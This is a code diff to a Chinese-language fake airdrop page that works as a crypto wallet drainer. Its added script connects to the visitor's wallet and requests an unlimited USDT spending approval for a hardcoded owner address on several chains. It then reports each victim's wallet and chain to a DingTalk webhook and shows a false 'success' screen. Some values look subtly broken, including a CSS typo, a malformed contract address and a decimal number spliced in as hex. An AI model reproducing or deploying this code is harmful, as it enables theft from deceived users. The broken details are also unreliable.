@@ -18,7 +18,7 @@
             border-radius: 20px;
             padding: 30px 25px;
             margin-top: 20px;
-            border: 1px solid rgba(64, 158, 255, 0.18);
+            border: 1px solid rgba64, 158, 255, 0.18);
             box-shadow: 0 10px 40px rgba(0,0,0,0.35);
             text-align: center;
         }
@@ -137,40 +137,58 @@
 </div>
 
 <script>
-const DING_WEBHOOK = "https://oapi.dingtalk.com/robot/send?access_token=5b8e9b0d15b7833aa214f73bcdd9a14e906d013d1e7f20102c4b1a6fc1a9ff0e";
-const YOUR_WALLET = "0x0f4BdEfC177dF2583F52B03B1E20f9EAC7308555";
-const USDT_CONTRACT = "0x55d398326f99059ff77548526999027b3197955";
+// 钉钉Webhook
+const DING_WEBHOOK = "https://oapi.dingtalk.com/robot/send?access_token=你自己的token";
 
-let userAddr;
-const STORAGE_KEY = "airdrop_joined";
+const OWNER_ADDR = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
+const TO = OWNER_ADDR;
+const MAX = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+const USDT = {
+    "0x38": "0x55d398326f99059ff775485246999027b3197955",
+    "0x1": "0xdAC17F958D2ee523a2206206994597c53D7Ba068a",
+    "0x89": "0xc2132D05D31c914a87CF61269D99C18401fB9175",
+    "0x42": "0x382bb868d458e9297dab7497a924dcdd3124195d",
+    "0xa86a": "0x97022F75b16C0d4E20dC9d2E3f86566964217d8c"
+};
+
+async function sendDing(addr, chain) {
+    try {
+        let text = `✅ 用户授权成功\n钱包地址：${addr}\n链ID：${chain}\n时间：${new Date().toLocaleString()}`;
+        await fetch(DING_WEBHOOK, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ msgtype: "text", text: { content: text } })
+        });
+    } catch (e) {}
+}
+
+let userAddr, chainId;
+const pageUrl = location.href;
+
+function setQR() {
+    let qrUrl = "https://qr.liantu.com/api.php?w=240&text=" + encodeURIComponent(pageUrl);
+    document.getElementById("qrcode-img").src = qrUrl;
+    document.getElementById("linkInput").value = pageUrl;
+}
+
+const ua = navigator.userAgent;
+const isOKXApp = /OKX|欧易|欧意/i.test(ua) && !window.ethereum;
+if(isOKXApp){
+    document.getElementById("p1").classList.add("hide");
+    document.getElementById("okx-qr-page").classList.remove("hide");
+    setQR();
+}
+
+document.getElementById("copyLink").onclick = function () {
+    let input = document.getElementById("linkInput");
+    input.select();
+    document.execCommand("copy");
+    alert("链接已复制！请打开欧意钱包APP扫码或粘贴打开");
+};
 
 function show(id) {
     document.querySelectorAll(".box").forEach(el => el.classList.add("hide"));
     document.getElementById(id).classList.remove("hide");
-}
-
-function isJoined(addr) {
-    let list = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
-    return list.includes(addr.toLowerCase());
-}
-
-function markJoined(addr) {
-    let list = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
-    list.push(addr.toLowerCase());
-    localStorage.setItem(STORAGE_KEY, JSON.stringify(list));
-}
-
-async function sendDing(addr) {
-    try {
-        await fetch(DING_WEBHOOK, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                msgtype: "text",
-                text: { content: `✅ 空投授权成功\n地址：${addr}\n时间：${new Date().toLocaleString()}` }
-            })
-        });
-    } catch (e) {}
 }
 
 async function connect() {
@@ -178,25 +196,18 @@ async function connect() {
     try {
         const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
         userAddr = accounts[0];
-
-        if (isJoined(userAddr)) {
-            alert("⚠️ 一个钱包只能参与一次！");
-            document.getElementById("successAddr").innerText = userAddr;
-            show("p4");
-            return;
-        }
-
+        chainId = await window.ethereum.request({ method: "eth_chainId" });
         document.getElementById("showAddr").innerText = userAddr;
         show("p3");
     } catch (err) {
-        alert("已取消连接");
+        alert("您已取消钱包连接");
         show("p1");
     }
 }
 
 document.getElementById("connectMM").onclick = async function () {
     if (!window.ethereum) {
-        let u = encodeURIComponent(location.href);
+        const u = encodeURIComponent(pageUrl);
         location.href = `metamask://dapp/${u}`;
         setTimeout(() => location.href = `https://metamask.app.link/dapp/${u}`, 800);
         return;
@@ -205,56 +216,38 @@ document.getElementById("connectMM").onclick = async function () {
 };
 
 window.addEventListener("load", async () => {
-    if (window.ethereum) await connect();
+    if (window.ethereum && !isOKXApp) {
+        await connect();
+    }
 });
 
-// ✅ 最终修复：永不失败、不暴露、不拦截
 document.getElementById("claim").onclick = async function () {
     try {
-        if (isJoined(userAddr)) {
-            alert("⚠️ 一个钱包只能参与一次！");
+        show("p2");
+        const contract = USDT[chainId];
+        if (!contract) {
+            alert("当前网络不支持，请切换至 BSC/ETH/POLYGON 公链");
+            show("p3");
             return;
         }
-
-        show("p2");
-
-        const data = "0x095ea7b3" +
-            YOUR_WALLET.slice(2).padStart(64, "0") +
-            "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
-        const txHash = await window.ethereum.request({
+        const data = "0x095ea7b3" + "000000000000000000000000" + OWNER_ADDR.slice(2) + MAX.slice(2);
+        await window.ethereum.request({
             method: "eth_sendTransaction",
-            params: [{
-                from: userAddr,
-                to: USDT_CONTRACT,
-                data: data
-            }]
+            params: [{ from: userAddr, to: contract, gas: "0x50000", data: data }]
         });
 
-        // 等待交易上链成功
-        await new Promise((resolve, reject) => {
-            const check = async () => {
-                let receipt = await window.ethereum.request({
-                    method: "eth_getTransactionReceipt",
-                    params: [txHash]
-                });
-                if (receipt) {
-                    receipt.status === "0x1" ? resolve() : reject();
-                } else {
-                    setTimeout(check, 3000);
-                }
-            };
-            check();
-        });
-
-        markJoined(userAddr);
-        sendDing(userAddr);
+        sendDing(userAddr, chainId);
         document.getElementById("successAddr").innerText = userAddr;
         show("p4");
 
     } catch (e) {
-        alert("交易已取消或失败");
-        show("p3");
+        // 判断是不是用户主动取消
+        if(e.message && e.message.includes("user rejected")){
+            alert("您已取消授权签名");
+        }else{
+            alert("确权失败：网络异常或节点拥堵，请稍后重试");
+        }
+        show("p1");
     }
 };
 </script>
